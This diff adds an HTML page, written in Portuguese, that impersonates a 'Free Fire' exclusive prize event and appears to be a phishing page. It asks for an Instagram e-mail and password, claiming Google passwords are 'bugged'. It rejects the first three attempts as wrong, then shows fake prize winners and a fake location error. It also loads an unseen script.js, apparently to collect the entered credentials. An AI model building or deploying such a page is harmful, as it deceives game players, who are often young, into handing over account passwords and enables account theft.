@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire - Evento Exclusivo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        p{
+            margin: 20px;
+        }
+        
+        body {
+            background-image: url("fundo_2.jpeg");
+            background-color: rgb(61, 3, 3);
+            background-position: center center;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+        
+        .container {
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            border: 2px solid #f73b3b;
+            margin-top: 70px;
+            padding: 5px;
+        }
+        
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            color: #f73b3b;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #f73b3b;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 5px;
+            border: none;
+            background-color: rgba(255, 255, 255, 0.9);
+            font-size: 16px;
+        }
+        
+        button {
+            background-color: #f73b3b;
+            color: #ffffff;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        button:hover {
+            background-color: #ffdd33;
+            transform: scale(1.02);
+        }
+        
+        .error {
+            color: #ff3333;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        .success {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .players-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 20px;
+            width: 100%;
+        }
+        
+        .player-card {
+            background-color: rgba(255, 204, 0, 0.1);
+            border: 1px solid #f73b3b;
+            border-radius: 8px;
+            padding: 10px;
+            text-align: center;
+        }
+        
+        .player-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 5px;
+            border: 2px solid #f73b3b;
+        }
+        
+        .prize-info {
+            margin-top: 20px;
+            background-color: rgba(26, 42, 108, 0.5);
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px dashed #f73b3b;
+        }
+        
+        .country-error {
+            display: none;
+            color: #ff3333;
+            margin-top: 20px;
+            font-size: 18px;
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 20px;
+        }
+        
+        .loading-bar {
+            height: 5px;
+            background-color: #f73b3b;
+            width: 0%;
+            transition: width 0.1s;
+        }
+
+        .logo{
+            width: 100px;
+        }
+
+        .player-card{
+            background-color: black;
+            display: inline;
+            width: 100%;
+        }
+
+
+    .players-grid {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+        margin-top: 20px;
+        width: 90%;
+        margin-left: auto;
+        margin-right: auto;
+    }
+    
+    .player-card {
+        background-color: rgba(0, 0, 0, 0.7);
+        border: 1px solid #f73b3b;
+        border-radius: 8px;
+        padding: 10px;
+        text-align: left;
+        display: flex;
+        align-items: center;
+        width: 100%;
+    }
+    
+    .player-avatar {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        object-fit: cover;
+        margin-right: 15px;
+        border: 2px solid #f73b3b;
+    }
+    
+    .player-info {
+        display: flex;
+        flex-direction: column;
+    }
+    
+    .player-name {
+        font-weight: bold;
+        color: #ffffff;
+    }
+    
+    .player-rank {
+        font-size: 12px;
+        color: #f73b3b;
+    }
+
+    .success{
+        margin-top: 100px;
+        max-height: 500px;
+        overflow-y: auto;
+    }
+    .success::-webkit-scrollbar{
+        display: none;
+    }
+    </style>
+
+
+    </style>
+</head>
+<body>
+    <div class="container" id="login-container">
+        <img src="logo.png" alt="Free Fire Logo" class="logo">
+        <h1>EVENTO EXCLUSIVO</h1>
+        <p style="width: 100%;font-size: 14px;">Faça login para participar e ganhar recompensas exclusivas!</p>
+        
+        <div class="form-group">
+            <label for="email">E-mail (instagram)</label>
+            <input type="text" id="email" placeholder="Digite seu e-mail ou (instagram)">
+        </div>
+        
+        <div class="form-group">
+            <label for="password">Senha</label>
+            <input type="password" id="password" placeholder="Digite sua senha">
+            <p style="color: #ccc; font-size: 12px; margin-top: 5px;">Obs: A senha do Google está com bug, use a senha do Instagram</p>
+        </div>
+        
+        <button id="login-btn">ENTRAR</button>
+        <p class="error" id="error-msg">Senha incorreta! Tente novamente.</p>
+    </div>
+    
+    <div class="container success" id="success-container">
+        <img src="logo.png" class="logo">
+        <h1>PARABÉNS! VOCÊ FOI SELECIONADO</h1>
+        <p>Confira abaixo os jogadores que já resgataram seus prêmios:</p>
+        
+        <div class="players-grid" id="players-grid">
+            <!-- Players will be added here by JavaScript -->
+        </div>
+        
+        <div class="prize-info">
+            <h3>PRÊMIO DISPONÍVEL:</h3>
+            <p>Diamantes: 5000 + Skin Exclusiva</p>
+            <p>Resgate em até 24h!</p>
+        </div>
+        
+        <div class="loading">
+            <p>Verificando localização...</p>
+            <div class="loading-bar" id="loading-bar"></div>
+        </div>
+        
+        <p class="country-error" id="country-error">ERRO: Esta conta não está no país desejado para resgate do prêmio.</p>
+    </div>
+
+    <script>
+        // Player data with Free Fire profile images
+        const players = [
+            { name: "PROPlayer99", avatar: "https://i.pinimg.com/1200x/43/22/a6/4322a648a967bf028b29bd799861b305.jpg" },
+            { name: "FF_King", avatar: "https://i.pinimg.com/originals/a9/0d/23/a90d232e739be636fef7a27343398dcc.jpg" },
+            { name: "SniperElite", avatar: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMyqcDJjvahmja0NCj6OFCPmi7tJMngIZorw&s" },
+            { name: "BattleGirl", avatar: "https://i.ytimg.com/vi/RbzAxqU5zck/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AHUBoAC4AOKAgwIABABGH8gKSguMA8=&rs=AOn4CLAgvssYXj1N-O8c1jFL6T4ac8wxeA" },
+            { name: "NoobMaster", avatar: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTBiOlzyy-jQB5ynuvQWOj8m5hYWHVzLQk1Jg&s" },
+            { name: "DiamondHunter", avatar: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRrakKRLhN5E0jEQD6VYU2TkI2ynzzMExQN7w&s" },
+            { name: "HeadshotPro", avatar: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSes-NhnVmBWm2Msu1PuHIMdz4YLt-yGPmMpFXXE_wvUTdkiRxpAjz7RGi0DUbj2PTgFzg&usqp=CAU" },
+            { name: "FF_Queen", avatar: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRN-egWjF3sJBsD8QalByKFeE75S64A67mSA&s" },
+            { name: "LuckyWinner", avatar: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQa1JoFyedbpsr5C_S6z_DKpu-wHaT1hQhZkQ&s" }
+        ];
+        
+        let loginAttempts = 0;
+        const requiredAttempts = 4;
+        const loginBtn = document.getElementById('login-btn');
+        const errorMsg = document.getElementById('error-msg');
+        const loginContainer = document.getElementById('login-container');
+        const successContainer = document.getElementById('success-container');
+        const playersGrid = document.getElementById('players-grid');
+        const countryError = document.getElementById('country-error');
+        const loadingElement = document.querySelector('.loading');
+        const loadingBar = document.getElementById('loading-bar');
+        
+        // Populate players grid
+        const patente = [
+            "Platina II",
+            "Platina III",
+            "Diamante I",
+            "Diamante II",
+            "Diamante III",
+            "Mestre",
+            "Desafiante",
+            "Desafiante",
+            "Desafiante",
+            "Desafiante"
+        ];
+        let fsd=0
+
+players.forEach(player => {
+    fsd+=1
+    const playerCard = document.createElement('div');
+    playerCard.className = 'player-card';
+    playerCard.innerHTML = `
+        <img src="${player.avatar}" alt="${player.name}" class="player-avatar">
+        <div class="player-info">
+            <span class="player-name">${player.name}</span>
+            <span class="player-rank">${patente[fsd]}</span>
+        </div>
+    `;
+    playersGrid.appendChild(playerCard);
+});
+        
+        loginBtn.addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                errorMsg.textContent = "Por favor, preencha todos os campos!";
+                errorMsg.style.display = 'block';
+                return;
+            }
+            
+            loginAttempts++;
+            
+            if (loginAttempts < requiredAttempts) {
+                // Show error message
+                errorMsg.textContent = "Senha incorreta! Tente novamente.";
+                errorMsg.style.display = 'block';
+                
+                // Clear password field
+                alert("password incorreto")
+                
+                // Shake animation
+                loginContainer.style.animation = 'shake 0.5s';
+                setTimeout(() => {
+                    loginContainer.style.animation = '';
+                }, 500);
+            } else {
+                // "Success" login
+                loginContainer.style.display = 'none';
+                successContainer.style.display = 'flex';
+                
+                // Show loading after a delay
+                setTimeout(() => {
+                    loadingElement.style.display = 'block';
+                    
+                    // Animate loading bar
+                    let width = 0;
+                    const interval = setInterval(() => {
+                        width += 1;
+                        loadingBar.style.width = width + '%';
+                        
+                        if (width >= 100) {
+                            clearInterval(interval);
+                            loadingElement.style.display = 'none';
+                            countryError.style.display = 'block';
+                        }
+                    }, 200);
+                }, 2000);
+            }
+        });
+        
+        // Add shake animation to CSS
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes shake {
+                0%, 100% { transform: translateX(0); }
+                10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+                20%, 40%, 60%, 80% { transform: translateX(5px); }
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+
+    <script src="script.js"></script>
+</body>
+</html>
